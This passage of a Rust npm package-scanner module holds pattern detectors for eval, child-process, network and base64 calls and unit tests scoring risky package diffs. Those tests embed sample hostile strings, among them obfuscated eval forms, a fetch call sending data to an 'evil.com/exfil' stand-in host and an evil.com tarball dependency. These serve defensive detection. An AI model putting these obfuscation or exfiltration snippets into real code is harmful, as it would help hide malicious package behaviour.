        || s_clean.contains("http2.connect(")
        || s_clean.contains("http2.createSecureServer(")
        || s_clean.contains("http2.createServer(")
        || s_clean.contains("dns.resolve(")
        || s_clean.contains("dns.resolve4(")
        || s_clean.contains("dns.resolve6(")
        || s_clean.contains("dns.resolveTxt(")
        || s_clean.contains("dns.lookup(")
        || s_clean.contains("dns.promises")
        || NETWORK_MODULES
            .iter()
            .any(|&m| contains_module_import(s_clean, m))
}

#[cfg(test)]
fn is_network_invocation(s: &str) -> bool {
    has_network_invocation(&normalize_js(s))
}

fn has_dynamic_global_invocation(s_clean: &str) -> bool {
    for prefix in &["globalThis[", "window[", "global["] {
        let mut search_idx = 0;
        while let Some(pos) = s_clean[search_idx..].find(prefix) {
            let actual_idx = search_idx + pos;
            let is_start = actual_idx == 0;
            let prev_is_ident = if is_start {
                false
            } else {
                let prev_char = s_clean[..actual_idx].chars().next_back().unwrap_or(' ');
                prev_char.is_ascii_alphanumeric() || prev_char == '_' || prev_char == '$'
            };

            let start = actual_idx + prefix.len();
            search_idx = start;

            if prev_is_ident {
                continue;
            }

            let mut depth = 1usize;
            let mut end_idx = None;
            let mut in_q: Option<char> = None;
            let mut chars_iter = s_clean[start..].char_indices();

            while let Some((idx, ch)) = chars_iter.next() {
                if let Some(q) = in_q {
                    if ch == '\\' {
                        chars_iter.next();
                        continue;
                    }
                    if ch == q {
                        in_q = None;
                    }
                    continue;
                }
                if ch == '"' || ch == '\'' || ch == '`' {
                    in_q = Some(ch);
                    continue;
                }
                if ch == '[' {
                    depth += 1;
                } else if ch == ']' {
                    depth -= 1;
                    if depth == 0 {
                        end_idx = Some(start + idx);
                        break;
                    }
                }
            }

            if let Some(bracket_end) = end_idx {
                let after_bracket = bracket_end + 1;
                if after_bracket < s_clean.len() {
                    let next_ch = s_clean[after_bracket..].chars().next().unwrap_or(' ');
                    if next_ch == '(' || next_ch == '`' {
                        return true;
                    }
                }
            }
        }
    }
    false
}

fn has_timer_eval_invocation(s_clean: &str) -> bool {
    const TIMERS: [&str; 3] = ["setTimeout(", "setInterval(", "setImmediate("];
    const STRING_STARTERS: [&str; 7] = [
        "\"",
        "'",
        "`",
        "String.fromCharCode",
        "fromCharCode",
        "Buffer.from",
        "atob(",
    ];

    for timer in TIMERS {
        let mut search_idx = 0;
        while let Some(pos) = s_clean[search_idx..].find(timer) {
            let actual_idx = search_idx + pos;
            let prev_is_ident = actual_idx > 0 && {
                let prev = s_clean[..actual_idx].chars().next_back().unwrap_or(' ');
                prev.is_ascii_alphanumeric() || prev == '_' || prev == '$'
            };
            let after = &s_clean[actual_idx + timer.len()..];
            if !prev_is_ident
                && STRING_STARTERS
                    .iter()
                    .any(|&prefix| after.starts_with(prefix))
            {
                return true;
            }
            search_idx = actual_idx + timer.len();
        }
    }
    false
}

fn contains_scoped_eval(s: &str) -> bool {
    const SCOPES: [&str; 4] = ["globalThis", "window", "global", "this"];
    const CHAR_CODE_PATTERNS: [&str; 3] = [
        "String.fromCharCode",
        "fromCharCode",
        "String.fromCodePoint",
    ];
    const QUOTES: [char; 3] = ['\'', '"', '`'];
    const TARGETS: [&str; 2] = ["eval", "Function"];

    for scope in SCOPES {
        let mut search_idx = 0;
        while let Some(pos) = s[search_idx..].find(scope) {
            let start = search_idx + pos + scope.len();
            let rest = &s[start..];
            if rest.starts_with(".eval") {
                return true;
            }
            for pat in CHAR_CODE_PATTERNS {
                if let Some(after_bracket) = rest.strip_prefix('[')
                    && after_bracket.starts_with(pat)
                {
                    return true;
                }
            }
            for target in TARGETS {
                for q in QUOTES {
                    if let Some(after_bracket) = rest.strip_prefix('[')
                        && let Some(after_q) = after_bracket.strip_prefix(q)
                        && let Some(after_target) = after_q.strip_prefix(target)
                        && let Some(after_close_q) = after_target.strip_prefix(q)
                        && after_close_q.starts_with(']')
                    {
                        return true;
                    }
                }
            }
            search_idx = start;
        }

        let reflect_prefix = "Reflect.get(";
        let mut ref_idx = 0;
        while let Some(pos) = s[ref_idx..].find(reflect_prefix) {
            let start = ref_idx + pos + reflect_prefix.len();
            let rest = &s[start..];
            if let Some(after_scope) = rest.strip_prefix(scope)
                && let Some(after_comma) = after_scope.strip_prefix(',')
            {
                for pat in CHAR_CODE_PATTERNS {
                    if after_comma.starts_with(pat) {
                        return true;
                    }
                }
                for target in TARGETS {
                    for q in QUOTES {
                        if let Some(after_q) = after_comma.strip_prefix(q)
                            && let Some(after_target) = after_q.strip_prefix(target)
                            && let Some(after_close_q) = after_target.strip_prefix(q)
                            && after_close_q.starts_with(')')
                        {
                            return true;
                        }
                    }
                }
            }
            ref_idx = start;
        }
    }
    false
}

fn has_eval_invocation(s_clean: &str) -> bool {
    has_dynamic_global_invocation(s_clean)
        || has_timer_eval_invocation(s_clean)
        || contains_scoped_eval(s_clean)
        || contains_call(s_clean, "eval(")
        || contains_call(s_clean, "eval`")
        || s_clean.contains("(eval)(")
        || s_clean.contains(",eval)")
        || s_clean.contains(",eval;")
        || s_clean.contains("eval)(")
        || s_clean.contains("eval.call(")
        || s_clean.contains("eval.apply(")
        || s_clean.contains("eval.bind(")
        || s_clean.contains("Function.call(")
        || s_clean.contains("Function.apply(")
        || s_clean.contains("Function.bind(")
        || contains_call(s_clean, "Function(")
        || contains_call(s_clean, "Function`")
        || s_clean.contains("newFunction(")
        || s_clean.contains("newFunction`")
        || s_clean.contains("(Function)(")
        || s_clean.contains("(Function)`")
        || s_clean.contains("(Function).call(")
        || s_clean.contains("(Function).apply(")
        || contains_call(s_clean, "AsyncFunction(")
        || contains_call(s_clean, "AsyncFunction`")
        || contains_call(s_clean, "GeneratorFunction(")
        || contains_call(s_clean, "GeneratorFunction`")
        || contains_call(s_clean, "AsyncGeneratorFunction(")
        || contains_call(s_clean, "AsyncGeneratorFunction`")
        || s_clean.contains(".constructor")
        || s_clean.contains("['constructor']")
        || s_clean.contains("[\"constructor\"]")
        || s_clean.contains("[`constructor`]")
        || s_clean.contains("Function.prototype")
        || s_clean.contains("Object.getPrototypeOf")
        || s_clean.contains("Reflect.getPrototypeOf")
        || s_clean.contains("Reflect.construct(")
        || s_clean.contains("Reflect.apply(")
        || {
            const SCHEMES: [&str; 3] = ["data:", "http://", "https://"];
            let mut search_idx = 0;
            let mut found = false;
            while let Some(pos) = s_clean[search_idx..].find("import(") {
                let start = search_idx + pos + "import(".len();
                let rest = &s_clean[start..];
                for q in ['\'', '"', '`'] {
                    if let Some(after_q) = rest.strip_prefix(q)
                        && SCHEMES.iter().any(|&scheme| after_q.starts_with(scheme))
                    {
                        found = true;
                        break;
                    }
                }
                if found {
                    break;
                }
                search_idx = start;
            }
            found
        }
        || s_clean.contains("import.meta")
        || s_clean.contains("WebAssembly.compile")
        || s_clean.contains("WebAssembly.instantiate")
        || s_clean.contains("WebAssembly.Instance")
        || s_clean.contains("WebAssembly.Module")
}

#[cfg(test)]
fn is_eval_invocation(s: &str) -> bool {
    has_eval_invocation(&normalize_js(s))
}

fn has_child_proc_invocation(s_clean: &str) -> bool {
    const CALLS: [&str; 7] = [
        "dlopen(",
        "execSync(",
        "spawnSync(",
        "execFileSync(",
        "execFile(",
        "spawn(",
        "fork(",
    ];
    const MODULES: [&str; 3] = ["child_process", "worker_threads", "cluster"];
    const BINDINGS: [&str; 2] = ["spawn_sync", "process_wrap"];
    const QUOTES: [char; 3] = ['\'', '"', '`'];

    s_clean.contains("node:child_process")
        || s_clean.contains("node:worker_threads")
        || s_clean.contains("node:cluster")
        || s_clean.contains("process.dlopen")
        || s_clean.contains("process._linkedBinding")
        || s_clean.contains("process.getBuiltinModule")
        || s_clean.contains("process.mainModule")
        || s_clean.contains("module.require(")
        || MODULES.iter().any(|m| s_clean.contains(m))
        || CALLS.iter().any(|c| contains_call(s_clean, c))
        || {
            let mut search_idx = 0;
            let mut found = false;
            while let Some(pos) = s_clean[search_idx..].find("process.binding(") {
                let start = search_idx + pos + "process.binding(".len();
                let rest = &s_clean[start..];
                for q in QUOTES {
                    for b in BINDINGS {
                        if let Some(after_q) = rest.strip_prefix(q)
                            && let Some(after_b) = after_q.strip_prefix(b)
                            && let Some(after_close_q) = after_b.strip_prefix(q)
                            && after_close_q.starts_with(')')
                        {
                            found = true;
                            break;
                        }
                    }
                }
                if found {
                    break;
                }
                search_idx = start;
            }
            found
        }
        || {
            let mut search_idx = 0;
            let mut found = false;
            while let Some(pos) = s_clean[search_idx..].find("process[") {
                let start = search_idx + pos + "process[".len();
                let rest = &s_clean[start..];
                for q in QUOTES {
                    if let Some(after_q) = rest.strip_prefix(q)
                        && let Some(after_mod) = after_q.strip_prefix("mainModule")
                        && let Some(after_close_q) = after_mod.strip_prefix(q)
                        && after_close_q.starts_with(']')
                    {
                        found = true;
                        break;
                    }
                }
                if found {
                    break;
                }
                search_idx = start;
            }
            found
        }
        || {
            let mut search_idx = 0;
            let mut found = false;
            while let Some(pos) = s_clean[search_idx..].find("module[") {
                let start = search_idx + pos + "module[".len();
                let rest = &s_clean[start..];
                for q in QUOTES {
                    if let Some(after_q) = rest.strip_prefix(q)
                        && let Some(after_req) = after_q.strip_prefix("require")
                        && let Some(after_close_q) = after_req.strip_prefix(q)
                        && let Some(after_bracket) = after_close_q.strip_prefix(']')
                        && after_bracket.starts_with('(')
                    {
                        found = true;
                        break;
                    }
                }
                if found {
                    break;
                }
                search_idx = start;
            }
            found
        }
}

#[cfg(test)]
fn is_child_proc_invocation(s: &str) -> bool {
    has_child_proc_invocation(&normalize_js(s))
}

fn has_base64_decode(s_clean_lower: &str) -> bool {
    (s_clean_lower.contains("buffer.from(")
        && (s_clean_lower.contains("'base64'")
            || s_clean_lower.contains("\"base64\"")
            || s_clean_lower.contains("`base64`")
            || s_clean_lower.contains("'base64url'")
            || s_clean_lower.contains("\"base64url\"")
            || s_clean_lower.contains("`base64url`")
            || s_clean_lower.contains("'hex'")
            || s_clean_lower.contains("\"hex\"")
            || s_clean_lower.contains("`hex`")))
        || s_clean_lower.contains("atob(")
        || s_clean_lower.contains("btoa(")
}

#[cfg(test)]
fn is_base64_decode(s: &str) -> bool {
    let s_folded = normalize_js(s);
    let s_clean_lower = s_folded.to_ascii_lowercase();
    has_base64_decode(&s_clean_lower)
}

fn is_suspicious_high_entropy(line: &str) -> bool {
    // Only check long tokens (> 64 chars) without whitespace
    for token in line.split_whitespace() {
        if token.len() >= 64 {
            let entropy = shannon_entropy(token);
            if entropy > 5.5 {
                return true;
            }
        }
    }
    false
}

fn shannon_entropy(s: &str) -> f64 {
    let mut counts = [0u32; 256];
    let mut total = 0u32;
    for b in s.bytes() {
        counts[b as usize] += 1;
        total += 1;
    }
    if total == 0 {
        return 0.0;
    }
    let total_f = total as f64;
    let mut entropy = 0.0;
    for &c in &counts {
        if c > 0 {
            let p = c as f64 / total_f;
            entropy -= p * p.log2();
        }
    }
    entropy
}

fn normalize_repo_uri(mut s: &str) -> &str {
    s = s.trim();
    for prefix in &[
        "git+https://",
        "git+http://",
        "git+ssh://",
        "https://",
        "http://",
        "ssh://",
        "git://",
    ] {
        if let Some(rest) = s.strip_prefix(prefix) {
            s = rest;
            break;
        }
    }
    if let Some(rest) = s.strip_prefix("git@") {
        s = rest;
    }
    if let Some(idx) = s.find('@') {
        s = &s[..idx];
    }
    if let Some(rest) = s.strip_suffix(".git") {
        s = rest;
    }
    s.trim_end_matches('/')
}

/// Check if a provenance repository matches an allowed repository pattern on path boundaries.
pub fn is_repo_allowed(provenance_repo: &str, allowed_pattern: &str) -> bool {
    let norm_repo = normalize_repo_uri(provenance_repo);
    let norm_pattern = normalize_repo_uri(allowed_pattern);

    if norm_repo.eq_ignore_ascii_case(norm_pattern) {
        return true;
    }

    if let Some(stripped) = norm_repo.strip_suffix(norm_pattern)
        && (stripped.ends_with('/') || stripped.ends_with(':'))
    {
        return true;
    }

    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::diff::FileChange;

    #[test]
    fn blocks_on_lifecycle_scripts() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 5,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec!["postinstall".into()],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
        );
        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(verdict.risk_score >= 50);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R01_LIFECYCLE_SCRIPT_ADDED")
        );
    }

    #[test]
    fn flags_suspicious_eval_and_binaries() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.1.0".into(),
            files_added: vec![FileChange {
                relative_path: "index.js".into(),
                kind: FileKind::Text,
                lines_added: 2,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: Some("+const x = eval(payload);\n".into()),
            }],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 2,
            total_lines_deleted: 0,
            new_executables: vec!["payload.node".into()],
            new_binaries: vec!["payload.node".into()],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
        );
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R03_EVAL_USAGE")
        );
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R02_EXECUTABLE_ADDED")
        );
    }

    #[test]
    fn flags_opaque_large_file_added() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![FileChange {
                relative_path: "large.bin".into(),
                kind: FileKind::OpaqueTooLarge,
                lines_added: 0,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: None,
            }],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec!["large.bin".into()],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
        );
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R02_OPAQUE_LARGE_FILE_ADDED")
        );
    }

    #[test]
    fn blocks_on_binding_gyp_addition() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![FileChange {
                relative_path: "binding.gyp".into(),
                kind: FileKind::Text,
                lines_added: 5,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: None,
            }],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 5,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: true,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
        );
        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R01_BINDING_GYP_ADDED")
        );
    }

    #[test]
    fn detects_obfuscated_eval_and_multiline() {
        assert!(is_eval_invocation(r#"\x65val(payload)"#));
        assert!(is_eval_invocation(r#"\u0065val(payload)"#));
        assert!(is_eval_invocation("eval\n(payload)"));
        assert!(is_eval_invocation("window['\\x65val'](x)"));
        assert!(is_eval_invocation("(() => {}).constructor('return 1')()"));
        assert!(is_eval_invocation(
            "Reflect.construct(Function, ['code'])()"
        ));
    }

    #[test]
    fn detects_child_proc_variants() {
        assert!(is_child_proc_invocation("execSync('whoami')"));
        assert!(is_child_proc_invocation("spawnSync('ls')"));
        assert!(is_child_proc_invocation("execFileSync('sh')"));
        assert!(is_child_proc_invocation("child_process\n.execSync(cmd)"));
        assert!(is_child_proc_invocation(
            "process.getBuiltinModule('child_process')"
        ));
    }

    #[test]
    fn detects_non_semver_urls_in_dependencies() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![("malicious-pkg".into(), "ssh://git@host/repo".into())],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
        );
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R04_DEPENDENCY_ADDED" && f.severity == VerdictBand::High)
        );
    }

    #[test]
    fn first_sighting_elevated_to_medium() {
        let delta = Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![FileChange {
                relative_path: "index.js".into(),
                kind: FileKind::Text,
                lines_added: 1,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: None,
            }],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 1,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
        );
        assert_eq!(verdict.band, VerdictBand::Medium);
        assert_eq!(verdict.risk_score, 15);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R06_FIRST_SIGHTING" && f.severity == VerdictBand::Medium)
        );
    }

    #[test]
    fn flags_unreviewed_predecessor_baseline() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            true,
        );
        assert_eq!(verdict.band, VerdictBand::Medium);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R07_UNREVIEWED_PREDECESSOR_BASELINE")
        );
    }

    #[test]
    fn allow_unreviewed_baseline_downgrades_bootstrap_findings_without_hiding_them() {
        let first_sighting = Delta {
            baseline_version: None,
            target_version: "1.0.0".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };
        let unreviewed = Delta {
            baseline_version: Some("1.0.0".into()),
            ..first_sighting.clone()
        };

        let mut policy = Policy::default();
        policy
            .allowlist
            .packages
            .push(crate::policy::PackageAllowRule {
                name: "test-pkg".into(),
                ecosystem: None,
                allowed_scripts: vec![],
                max_risk: None,
                integrity: None,
                allow_unreviewed_baseline: true,
            });

        for (name, delta, unreviewed_flag) in [
            ("test-pkg", &first_sighting, false),
            ("test-pkg", &unreviewed, true),
            ("other-pkg", &first_sighting, false),
            ("other-pkg", &unreviewed, true),
        ] {
            let verdict = evaluate_with_policy(
                name,
                Ecosystem::Npm,
                "verified (sha512)",
                delta,
                unreviewed_flag,
                &policy,
            );
            let r06 = verdict
                .findings
                .iter()
                .find(|f| f.rule_id == "R06_FIRST_SIGHTING");
            let r07 = verdict
                .findings
                .iter()
                .find(|f| f.rule_id == "R07_UNREVIEWED_PREDECESSOR_BASELINE");
            if name == "test-pkg" {
                assert_eq!(verdict.band, VerdictBand::Low);
                assert_eq!(verdict.risk_score, 0);
                if delta.baseline_version.is_none() {
                    assert_eq!(r06.unwrap().severity, VerdictBand::Low);
                    assert!(r07.is_none());
                } else {
                    assert!(r06.is_none());
                    assert_eq!(r07.unwrap().severity, VerdictBand::Low);
                }
            } else {
                assert_eq!(verdict.band, VerdictBand::Medium);
                assert!(verdict.risk_score > 0);
            }
        }
    }

    #[test]
    fn allow_unreviewed_baseline_still_blocks_real_threats() {
        use crate::diff::{FileChange, FileKind};

        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![FileChange {
                relative_path: "index.js".into(),
                kind: FileKind::Text,
                is_executable: false,
                lines_added: 1,
                lines_deleted: 0,
                unified_diff: Some("+eval(process.argv[2])".into()),
            }],
            total_lines_added: 1,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let mut policy = Policy::default();
        policy
            .allowlist
            .packages
            .push(crate::policy::PackageAllowRule {
                name: "sneaky-pkg".into(),
                ecosystem: None,
                allowed_scripts: vec![],
                max_risk: None,
                integrity: None,
                allow_unreviewed_baseline: true,
            });

        let verdict = evaluate_with_policy(
            "sneaky-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            true,
            &policy,
        );
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.severity == VerdictBand::High)
        );
    }

    #[test]
    fn detects_octal_and_comment_obfuscations() {
        assert!(is_eval_invocation(r#"\145\166\141\154(payload)"#));
        assert!(is_eval_invocation("eval/*comment*/(payload)"));
        assert!(is_eval_invocation("new/**/Function(payload)"));
        assert!(is_eval_invocation("eval`payload`"));
        assert!(is_eval_invocation("Function('return this')()"));
    }

    #[test]
    fn detects_eval_after_inline_url() {
        assert!(is_eval_invocation(
            r#"const url = "http://evil.com"; eval(payload);"#
        ));
        assert!(is_eval_invocation(
            r#"const url = 'https://evil.com'; eval(payload);"#
        ));
        assert!(is_eval_invocation(
            "const url = `//comment-like`; eval(payload);"
        ));
    }

    #[test]
    fn detects_vm_and_network_primitives() {
        assert!(is_vm_invocation("vm.runInThisContext(code)"));
        assert!(is_vm_invocation("const script = new vm.Script(code)"));
        assert!(is_network_invocation("fetch('https://evil.com/exfil')"));
        assert!(is_network_invocation("http.request('http://evil.com', cb)"));
    }

    #[test]
    fn detects_modified_binaries() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![FileChange {
                relative_path: "binding.node".into(),
                kind: FileKind::Binary,
                lines_added: 0,
                lines_deleted: 0,
                is_executable: false,
                unified_diff: None,
            }],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec!["binding.node".into()],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
        );
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R02_BINARY_BLOB_MODIFIED")
        );
    }

    #[test]
    fn detects_modified_dependency_non_semver_url() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![(
                "cookie".into(),
                "0.7.1".into(),
                "https://evil.com/cookie.tgz".into(),
            )],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
        );
        assert_eq!(verdict.band, VerdictBand::High);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R04_DEPENDENCY_MODIFIED")
        );
    }

    #[test]
    fn detects_base64_variants_and_child_proc_bindings() {
        assert!(is_base64_decode("Buffer.from(x, 'base64url')"));
        assert!(is_base64_decode("Buffer.from(x, \"BASE64\")"));
        assert!(is_base64_decode("Buffer.from(x, 'hex')"));
        assert!(is_child_proc_invocation("process.binding('spawn_sync')"));
        assert!(is_child_proc_invocation(
            "process._linkedBinding('spawn_sync')"
        ));
    }

    #[test]
    fn escalates_to_block_on_high_accumulated_score() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.1.0".into(),
            files_added: vec![
                FileChange {
                    relative_path: "p1.exe".into(),
                    kind: FileKind::Binary,
                    lines_added: 0,
                    lines_deleted: 0,
                    is_executable: true,
                    unified_diff: None,
                },
                FileChange {
                    relative_path: "p2.exe".into(),
                    kind: FileKind::Binary,
                    lines_added: 0,
                    lines_deleted: 0,
                    is_executable: true,
                    unified_diff: None,
                },
                FileChange {
                    relative_path: "p3.exe".into(),
                    kind: FileKind::Binary,
                    lines_added: 0,
                    lines_deleted: 0,
                    is_executable: true,
                    unified_diff: None,
                },
                FileChange {
                    relative_path: "p4.exe".into(),
                    kind: FileKind::Binary,
                    lines_added: 0,
                    lines_deleted: 0,
                    is_executable: true,
                    unified_diff: None,
                },
            ],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![
                "p1.exe".into(),
                "p2.exe".into(),
                "p3.exe".into(),
                "p4.exe".into(),
            ],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let verdict = evaluate(
            "test-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
        );
        assert_eq!(verdict.risk_score, 100);
        assert_eq!(verdict.band, VerdictBand::Block);
    }

    #[test]
    fn policy_blocks_blacklisted_package() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec![],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let mut policy = Policy::default();
        policy
            .blocklist
            .packages
            .push(crate::policy::PackageBlockRule {
                pattern: "blocked-*".into(),
                ecosystem: None,
            });

        let verdict = evaluate_with_policy(
            "blocked-pkg",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
            &policy,
        );
        assert_eq!(verdict.band, VerdictBand::Block);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P01_PACKAGE_BLOCKED")
        );
    }

    #[test]
    fn policy_allows_whitelisted_lifecycle_script() {
        let delta = Delta {
            baseline_version: Some("1.0.0".into()),
            target_version: "1.0.1".into(),
            files_added: vec![],
            files_removed: vec![],
            files_modified: vec![],
            total_lines_added: 0,
            total_lines_deleted: 0,
            new_executables: vec![],
            new_binaries: vec![],
            modified_binaries: vec![],
            new_lifecycle_scripts: vec!["postinstall".into()],
            modified_lifecycle_scripts: vec![],
            new_dependencies: vec![],
            modified_dependencies: vec![],
            removed_dependencies: vec![],
            binding_gyp_added: false,
        };

        let mut policy = Policy::default();
        policy
            .allowlist
            .packages
            .push(crate::policy::PackageAllowRule {
                name: "esbuild".into(),
                ecosystem: None,
                allowed_scripts: vec!["postinstall".into()],
                max_risk: None,
                integrity: None,
                allow_unreviewed_baseline: false,
            });

        let verdict = evaluate_with_policy(
            "esbuild",
            Ecosystem::Npm,
            "verified (sha512)",
            &delta,
            false,
            &policy,
        );
        assert_eq!(verdict.band, VerdictBand::Low);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "P02_LIFECYCLE_SCRIPT_ALLOWED")
        );
    }

    #[test]
    fn detects_indirect_eval_and_optional_chaining() {
        assert!(is_eval_invocation("(0, eval)('malicious')"));
        assert!(is_eval_invocation("(eval)('malicious')"));
        assert!(is_eval_invocation("eval?.('malicious')"));
        assert!(is_eval_invocation("window?.eval?.('malicious')"));
        assert!(is_eval_invocation("eval.call(null, 'malicious')"));
